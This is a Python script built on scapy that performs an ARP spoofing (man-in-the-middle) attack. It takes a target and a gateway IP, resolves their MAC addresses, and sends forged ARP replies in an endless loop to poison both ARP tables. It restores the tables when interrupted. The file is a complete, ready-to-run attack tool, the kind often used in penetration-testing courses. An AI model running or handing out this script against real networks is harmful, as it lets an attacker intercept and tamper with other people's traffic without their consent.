import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import time
import scapy.all as scapy
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify a target IP, use --help for more info.")
    elif not options.gateway_ip:
        parser.error("[-] Please specify a gateway IP, use --help for more info.")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof_arp_table(victim_ip, victim_mac, false_requester_ip):
    target_arp_packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                                  psrc=false_requester_ip)  # OP = 2 ARP response, 1 = ARP request,
    scapy.send(target_arp_packet, verbose=False)  # To modify ARP table of victim


def restore_arp_table(victim_ip, victim_mac, false_requester_ip, false_requester_mac):
    target_arp_packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                                  psrc=false_requester_ip, hwsrc=false_requester_mac)
    scapy.send(target_arp_packet, verbose=False)  # To modify ARP table of victim


option = get_arguments()
target_mac = get_mac(option.target_ip)
gateway_mac = get_mac(option.gateway_ip)
print("MAC of target: " + target_mac)
print("MAC of gateway: " + gateway_mac)
count = 0
try:
    while True:
        spoof_arp_table(option.target_ip, target_mac, option.gateway_ip)
        spoof_arp_table(option.gateway_ip, gateway_mac, option.target_ip)
        count += 2
        print("\r[+] Packets sent: " + str(count), end="")
        time.sleep(1)

except KeyboardInterrupt:
    print("[+] Detected CTRL + C ...... Resetting ARP Tables ...... Please wait.")
    restore_arp_table(option.target_ip, target_mac, option.gateway_ip, gateway_mac)
    restore_arp_table(option.gateway_ip, gateway_mac, option.target_ip, target_mac)
    print("[+] ARP Tables Reset Successfully")
